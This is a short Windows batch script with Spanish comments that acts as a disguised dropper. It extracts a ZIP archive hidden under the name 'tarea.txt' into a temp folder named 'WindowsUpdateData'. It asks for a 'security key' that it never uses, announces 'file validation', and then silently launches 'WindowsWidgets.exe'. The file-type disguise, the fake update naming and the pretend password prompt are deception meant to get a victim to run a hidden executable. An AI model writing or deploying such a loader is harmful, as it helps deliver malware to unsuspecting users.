@echo off
set "fakeZip=%~dp0tarea.txt"
set "destDir=%TEMP%\WindowsUpdateData"

if not exist "%destDir%" mkdir "%destDir%"

echo [+] Iniciando validacion de archivos...
:: PowerShell pide la clave y extrae el contenido del .txt (que es un ZIP)
powershell -Command "$pass = Read-Host 'Introduce la clave de seguridad' -AsSecureString; $shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%fakeZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"

echo [+] Ejecutando componentes...
:: Ejecuta el archivo real desde la carpeta temporal
start "" "%destDir%\WindowsWidgets.exe"
exit